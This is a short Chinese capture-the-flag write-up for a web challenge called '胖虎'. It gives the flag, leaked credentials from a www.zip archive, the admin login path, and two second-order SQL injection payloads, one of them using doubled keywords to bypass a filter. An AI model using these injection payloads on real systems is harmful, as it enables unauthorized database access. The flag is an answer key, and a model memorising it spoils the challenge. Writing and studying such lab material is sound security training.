# 题目：胖虎

### 题目描述：胖虎，冈田武

### 题目难度： 🌟🌟🌟🌟🌟

### 维护：le31ei

### KEY: `flag{327a6c4304ad5938eaf0efb6cc3e53dc}`

### 配置信息： 
1. 开放端口： `8080`

### 解题过程：

1. 根目录下有个压缩包：`www.zip`，里面能收集到信息：`panghu`， `gangtianwu666`。
2. 扫描目录，后台登录口为：`admin_login.php`
3. 在提交作业解密的上传work文档存在二次注入。
4. 最后的payload为：

>`提交文件名：web' and 1=2 union select flag from flag where '.doc'='.doc`

>`查询：web' and 1=2 ununionion seselectlect flag from flag where '.doc'='.doc`

